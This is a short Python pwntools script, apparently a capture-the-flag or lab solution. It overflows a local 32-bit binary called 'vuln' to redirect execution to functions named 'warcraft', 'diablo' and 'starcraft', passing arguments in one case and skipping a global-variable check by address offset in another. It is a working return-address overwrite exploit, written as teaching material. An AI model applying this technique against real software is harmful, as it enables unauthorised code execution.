from pwn import *

def exploit_basic_binary(binary, padding, addr, params=None):
	p = process(binary)
	p.recvline()

	payload = padding * b'a' + p32(addr)
	if params:
		payload += b'aaaa' + b''.join([p32(p) for p in params])
	p.sendline(payload)

	p.recvline()
	p.recvline()
	print(p.recvline())
	p.close()


if __name__ == '__main__':
	elf = ELF('vuln')

	exploit_basic_binary('./vuln', 0x44, elf.symbols['warcraft'])
	exploit_basic_binary('./vuln', 0x44, elf.symbols['diablo'],
		[0x12345678, 0xaabbccdd])
	# Add 0xf to bypass global variable check
	exploit_basic_binary('./vuln', 0x44, elf.symbols['starcraft'] + 0xf)
